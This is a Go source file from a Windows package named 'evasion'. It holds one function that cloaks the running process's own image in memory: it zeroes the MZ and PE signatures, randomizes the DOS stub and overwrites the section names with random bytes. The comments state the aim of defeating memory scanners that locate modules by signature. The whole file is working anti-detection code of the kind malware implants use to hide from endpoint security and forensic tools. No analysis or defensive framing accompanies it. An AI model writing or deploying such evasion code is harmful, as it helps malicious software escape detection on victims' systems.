//go:build windows
// +build windows

package evasion

import (
	"crypto/rand"
	"unsafe"

	"golang.org/x/sys/windows"
)

// cloakPEHeader zeroes the MZ/PE signature and randomizes the DOS stub
// of the current process's PE header in memory.
// This defeats memory scanners that locate modules by MZ signature scan.
func cloakPEHeader() {
	// Get own module base via GetModuleHandleExW(0, nil, &handle).
	var base windows.Handle
	err := windows.GetModuleHandleEx(0, nil, &base)
	if err != nil || base == 0 {
		return
	}
	baseAddr := uintptr(base)

	// The PE header is at the start of the image (first page, typically 4KB).
	// Make it writable.
	const headerSize = 0x1000
	old, ok := ntProtect(baseAddr, headerSize, windows.PAGE_READWRITE)
	if !ok {
		return
	}
	defer ntProtect(baseAddr, headerSize, old)

	// Zero MZ signature (bytes 0-1).
	*(*uint16)(unsafe.Pointer(baseAddr)) = 0x0000

	// Randomize the DOS stub (bytes 2..0x3B) — the part between MZ and e_lfanew.
	junk := make([]byte, 0x3A)
	rand.Read(junk)
	for i, b := range junk {
		*(*byte)(unsafe.Pointer(baseAddr + 2 + uintptr(i))) = b
	}

	// Zero PE signature at e_lfanew.
	peOffset := *(*uint32)(unsafe.Pointer(baseAddr + 0x3C))
	if uintptr(peOffset)+4 < headerSize {
		*(*uint32)(unsafe.Pointer(baseAddr + uintptr(peOffset))) = 0x00000000
	}

	// Randomize section names in the section table.
	// Section table = peOffset + 4 (PE sig) + 20 (COFF file header) + SizeOfOptionalHeader.
	// IMAGE_SECTION_HEADER is 40 bytes; first 8 bytes are the section name (.text, .data, …).
	if uintptr(peOffset)+22 < headerSize {
		numSections := *(*uint16)(unsafe.Pointer(baseAddr + uintptr(peOffset) + 6))
		sizeOfOptHdr := *(*uint16)(unsafe.Pointer(baseAddr + uintptr(peOffset) + 20))
		sectionTableOff := uintptr(peOffset) + 24 + uintptr(sizeOfOptHdr)
		name8 := make([]byte, 8)
		for i := uint16(0); i < numSections; i++ {
			nameOff := sectionTableOff + uintptr(i)*40
			if nameOff+8 > headerSize {
				break
			}
			rand.Read(name8)
			namePtr := (*[8]byte)(unsafe.Pointer(baseAddr + nameOff))
			copy((*namePtr)[:], name8)
		}
	}
}
